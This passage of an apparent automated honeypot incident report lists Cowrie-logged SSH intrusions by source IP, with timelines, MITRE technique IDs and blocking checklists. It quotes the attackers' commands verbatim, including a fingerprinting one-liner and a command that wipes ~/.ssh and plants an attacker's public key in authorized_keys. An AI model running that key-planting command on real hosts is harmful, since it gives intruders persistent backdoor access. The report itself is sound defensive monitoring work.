| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 10:58:40` | `cowrie.session.connect` |
| `2026-07-05 10:58:41` | `cowrie.client.version` |
| `2026-07-05 10:58:41` | `cowrie.client.kex` |
| `2026-07-05 10:58:43` | `cowrie.login.success` |
| `2026-07-05 10:58:45` | `cowrie.session.params` |
| `2026-07-05 10:58:45` | `cowrie.command.input` |
| `2026-07-05 10:58:45` | `cowrie.command.input` |
| `2026-07-05 10:58:45` | `cowrie.command.input` |
| `2026-07-05 10:58:45` | `cowrie.command.input` |
| `2026-07-05 10:58:45` | `cowrie.command.input` |
| `2026-07-05 10:58:45` | `cowrie.command.success` |
| `2026-07-05 10:58:45` | `cowrie.command.input` |
| `2026-07-05 10:58:45` | `cowrie.command.input` |
| `2026-07-05 10:58:45` | `cowrie.command.input` |
| `2026-07-05 10:58:45` | `cowrie.command.input` |
| `2026-07-05 10:58:46` | `cowrie.log.closed` |
| `2026-07-05 10:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c85dc585c5ac

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:00 |
| **Last Seen** | 2026-07-05 11:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:00:14` | `cowrie.session.connect` |
| `2026-07-05 11:00:15` | `cowrie.client.version` |
| `2026-07-05 11:00:15` | `cowrie.client.kex` |
| `2026-07-05 11:00:18` | `cowrie.login.success` |
| `2026-07-05 11:00:20` | `cowrie.session.params` |
| `2026-07-05 11:00:20` | `cowrie.command.input` |
| `2026-07-05 11:00:20` | `cowrie.command.input` |
| `2026-07-05 11:00:20` | `cowrie.command.input` |
| `2026-07-05 11:00:20` | `cowrie.command.input` |
| `2026-07-05 11:00:20` | `cowrie.command.input` |
| `2026-07-05 11:00:20` | `cowrie.command.success` |
| `2026-07-05 11:00:20` | `cowrie.command.input` |
| `2026-07-05 11:00:20` | `cowrie.command.input` |
| `2026-07-05 11:00:20` | `cowrie.command.input` |
| `2026-07-05 11:00:20` | `cowrie.command.input` |
| `2026-07-05 11:00:21` | `cowrie.log.closed` |
| `2026-07-05 11:00:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f61a0559908

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-07-05 11:00 |
| **Last Seen** | 2026-07-05 11:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:00:41` | `cowrie.session.connect` |
| `2026-07-05 11:00:41` | `cowrie.client.version` |
| `2026-07-05 11:00:42` | `cowrie.client.kex` |
| `2026-07-05 11:00:43` | `cowrie.login.success` |
| `2026-07-05 11:00:44` | `cowrie.session.params` |
| `2026-07-05 11:00:44` | `cowrie.command.input` |
| `2026-07-05 11:00:44` | `cowrie.command.failed` |
| `2026-07-05 11:00:45` | `cowrie.log.closed` |
| `2026-07-05 11:00:45` | `cowrie.session.params` |
| `2026-07-05 11:00:45` | `cowrie.command.input` |
| `2026-07-05 11:00:46` | `cowrie.session.file_download` |
| `2026-07-05 11:00:46` | `cowrie.log.closed` |
| `2026-07-05 11:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17270bf78443

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-07-05 11:00 |
| **Last Seen** | 2026-07-05 11:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:00:46` | `cowrie.session.connect` |
| `2026-07-05 11:00:46` | `cowrie.client.version` |
| `2026-07-05 11:00:46` | `cowrie.client.kex` |
| `2026-07-05 11:00:47` | `cowrie.login.success` |
| `2026-07-05 11:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-353a79c48cda

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-07-05 11:00 |
| **Last Seen** | 2026-07-05 11:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:00:48` | `cowrie.session.connect` |
| `2026-07-05 11:00:48` | `cowrie.client.version` |
| `2026-07-05 11:00:48` | `cowrie.client.kex` |
| `2026-07-05 11:00:49` | `cowrie.login.success` |
| `2026-07-05 11:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d03fe857f723

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:01 |
| **Last Seen** | 2026-07-05 11:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:01:53` | `cowrie.session.connect` |
| `2026-07-05 11:01:53` | `cowrie.client.version` |
| `2026-07-05 11:01:53` | `cowrie.client.kex` |
| `2026-07-05 11:01:56` | `cowrie.login.success` |
| `2026-07-05 11:01:58` | `cowrie.session.params` |
| `2026-07-05 11:01:58` | `cowrie.command.input` |
| `2026-07-05 11:01:58` | `cowrie.command.input` |
| `2026-07-05 11:01:58` | `cowrie.command.input` |
| `2026-07-05 11:01:58` | `cowrie.command.input` |
| `2026-07-05 11:01:58` | `cowrie.command.input` |
| `2026-07-05 11:01:58` | `cowrie.command.success` |
| `2026-07-05 11:01:58` | `cowrie.command.input` |
| `2026-07-05 11:01:58` | `cowrie.command.input` |
| `2026-07-05 11:01:58` | `cowrie.command.input` |
| `2026-07-05 11:01:58` | `cowrie.command.input` |
| `2026-07-05 11:01:59` | `cowrie.log.closed` |
| `2026-07-05 11:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e42705457655

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:03 |
| **Last Seen** | 2026-07-05 11:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:03:28` | `cowrie.session.connect` |
| `2026-07-05 11:03:28` | `cowrie.client.version` |
| `2026-07-05 11:03:28` | `cowrie.client.kex` |
| `2026-07-05 11:03:31` | `cowrie.login.success` |
| `2026-07-05 11:03:33` | `cowrie.session.params` |
| `2026-07-05 11:03:33` | `cowrie.command.input` |
| `2026-07-05 11:03:33` | `cowrie.command.input` |
| `2026-07-05 11:03:33` | `cowrie.command.input` |
| `2026-07-05 11:03:33` | `cowrie.command.input` |
| `2026-07-05 11:03:33` | `cowrie.command.input` |
| `2026-07-05 11:03:33` | `cowrie.command.success` |
| `2026-07-05 11:03:33` | `cowrie.command.input` |
| `2026-07-05 11:03:33` | `cowrie.command.input` |
| `2026-07-05 11:03:33` | `cowrie.command.input` |
| `2026-07-05 11:03:33` | `cowrie.command.input` |
| `2026-07-05 11:03:34` | `cowrie.log.closed` |
| `2026-07-05 11:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-207f261fa3d7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.3[.]128` |
| **First Seen** | 2026-07-05 11:03 |
| **Last Seen** | 2026-07-05 11:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:03:39` | `cowrie.session.connect` |
| `2026-07-05 11:03:39` | `cowrie.client.version` |
| `2026-07-05 11:03:39` | `cowrie.client.kex` |
| `2026-07-05 11:03:40` | `cowrie.login.success` |
| `2026-07-05 11:03:40` | `cowrie.session.params` |
| `2026-07-05 11:03:40` | `cowrie.command.input` |
| `2026-07-05 11:03:40` | `cowrie.command.failed` |
| `2026-07-05 11:03:41` | `cowrie.log.closed` |
| `2026-07-05 11:03:41` | `cowrie.session.params` |
| `2026-07-05 11:03:41` | `cowrie.command.input` |
| `2026-07-05 11:03:41` | `cowrie.session.file_download` |
| `2026-07-05 11:03:41` | `cowrie.log.closed` |
| `2026-07-05 11:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.3[.]128` to AbuseIPDB if not already reported
- [ ] Block `217.60.3[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3057ac92683a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.3[.]128` |
| **First Seen** | 2026-07-05 11:03 |
| **Last Seen** | 2026-07-05 11:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:03:42` | `cowrie.session.connect` |
| `2026-07-05 11:03:42` | `cowrie.client.version` |
| `2026-07-05 11:03:42` | `cowrie.client.kex` |
| `2026-07-05 11:03:42` | `cowrie.login.success` |
| `2026-07-05 11:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.3[.]128` to AbuseIPDB if not already reported
- [ ] Block `217.60.3[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff3d31c0a405

| Field | Detail |
|---|---|
| **Source IP** | `217.60.3[.]128` |
| **First Seen** | 2026-07-05 11:03 |
| **Last Seen** | 2026-07-05 11:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:03:42` | `cowrie.session.connect` |
| `2026-07-05 11:03:42` | `cowrie.client.version` |
| `2026-07-05 11:03:42` | `cowrie.client.kex` |
| `2026-07-05 11:03:43` | `cowrie.login.success` |
| `2026-07-05 11:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.3[.]128` to AbuseIPDB if not already reported
- [ ] Block `217.60.3[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3129612b7ffe

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 11:03 |
| **Last Seen** | 2026-07-05 11:04 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:03:48` | `cowrie.session.connect` |
| `2026-07-05 11:03:50` | `cowrie.client.version` |
| `2026-07-05 11:03:50` | `cowrie.client.kex` |
| `2026-07-05 11:03:56` | `cowrie.login.success` |
| `2026-07-05 11:04:00` | `cowrie.session.params` |
| `2026-07-05 11:04:00` | `cowrie.command.input` |
| `2026-07-05 11:04:01` | `cowrie.log.closed` |
| `2026-07-05 11:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f812a7a325ec

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:05 |
| **Last Seen** | 2026-07-05 11:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:05:01` | `cowrie.session.connect` |
| `2026-07-05 11:05:01` | `cowrie.client.version` |
| `2026-07-05 11:05:01` | `cowrie.client.kex` |
| `2026-07-05 11:05:05` | `cowrie.login.success` |
| `2026-07-05 11:05:07` | `cowrie.session.params` |
| `2026-07-05 11:05:07` | `cowrie.command.input` |
| `2026-07-05 11:05:07` | `cowrie.command.input` |
| `2026-07-05 11:05:07` | `cowrie.command.input` |
| `2026-07-05 11:05:07` | `cowrie.command.input` |
| `2026-07-05 11:05:07` | `cowrie.command.input` |
| `2026-07-05 11:05:07` | `cowrie.command.success` |
| `2026-07-05 11:05:07` | `cowrie.command.input` |
| `2026-07-05 11:05:07` | `cowrie.command.input` |
| `2026-07-05 11:05:07` | `cowrie.command.input` |
| `2026-07-05 11:05:07` | `cowrie.command.input` |
| `2026-07-05 11:05:08` | `cowrie.log.closed` |
| `2026-07-05 11:05:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe5bcaf51116

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:06 |
| **Last Seen** | 2026-07-05 11:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:06:32` | `cowrie.session.connect` |
| `2026-07-05 11:06:33` | `cowrie.client.version` |
| `2026-07-05 11:06:33` | `cowrie.client.kex` |
| `2026-07-05 11:06:37` | `cowrie.login.success` |
| `2026-07-05 11:06:39` | `cowrie.session.params` |
| `2026-07-05 11:06:39` | `cowrie.command.input` |
| `2026-07-05 11:06:39` | `cowrie.command.input` |
| `2026-07-05 11:06:39` | `cowrie.command.input` |
| `2026-07-05 11:06:39` | `cowrie.command.input` |
| `2026-07-05 11:06:39` | `cowrie.command.input` |
| `2026-07-05 11:06:39` | `cowrie.command.success` |
| `2026-07-05 11:06:39` | `cowrie.command.input` |
| `2026-07-05 11:06:39` | `cowrie.command.input` |
| `2026-07-05 11:06:39` | `cowrie.command.input` |
| `2026-07-05 11:06:39` | `cowrie.command.input` |
| `2026-07-05 11:06:40` | `cowrie.log.closed` |
| `2026-07-05 11:06:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cc88b311e83

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:08 |
| **Last Seen** | 2026-07-05 11:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:08:13` | `cowrie.session.connect` |
| `2026-07-05 11:08:14` | `cowrie.client.version` |
| `2026-07-05 11:08:14` | `cowrie.client.kex` |
| `2026-07-05 11:08:17` | `cowrie.login.success` |
| `2026-07-05 11:08:19` | `cowrie.session.params` |
| `2026-07-05 11:08:19` | `cowrie.command.input` |
| `2026-07-05 11:08:19` | `cowrie.command.input` |
| `2026-07-05 11:08:19` | `cowrie.command.input` |
| `2026-07-05 11:08:19` | `cowrie.command.input` |
| `2026-07-05 11:08:19` | `cowrie.command.input` |
| `2026-07-05 11:08:19` | `cowrie.command.success` |
| `2026-07-05 11:08:19` | `cowrie.command.input` |
| `2026-07-05 11:08:19` | `cowrie.command.input` |
| `2026-07-05 11:08:19` | `cowrie.command.input` |
| `2026-07-05 11:08:19` | `cowrie.command.input` |
| `2026-07-05 11:08:20` | `cowrie.log.closed` |
| `2026-07-05 11:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b4977bf4c5c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:09 |
| **Last Seen** | 2026-07-05 11:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:09:50` | `cowrie.session.connect` |
| `2026-07-05 11:09:50` | `cowrie.client.version` |
| `2026-07-05 11:09:50` | `cowrie.client.kex` |
| `2026-07-05 11:09:54` | `cowrie.login.success` |
| `2026-07-05 11:09:56` | `cowrie.session.params` |
| `2026-07-05 11:09:56` | `cowrie.command.input` |
| `2026-07-05 11:09:56` | `cowrie.command.input` |
| `2026-07-05 11:09:56` | `cowrie.command.input` |
| `2026-07-05 11:09:56` | `cowrie.command.input` |
| `2026-07-05 11:09:56` | `cowrie.command.input` |
| `2026-07-05 11:09:56` | `cowrie.command.success` |
| `2026-07-05 11:09:56` | `cowrie.command.input` |
| `2026-07-05 11:09:56` | `cowrie.command.input` |
| `2026-07-05 11:09:56` | `cowrie.command.input` |
| `2026-07-05 11:09:56` | `cowrie.command.input` |
| `2026-07-05 11:09:57` | `cowrie.log.closed` |
| `2026-07-05 11:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b95f2c13144

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:11 |
| **Last Seen** | 2026-07-05 11:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
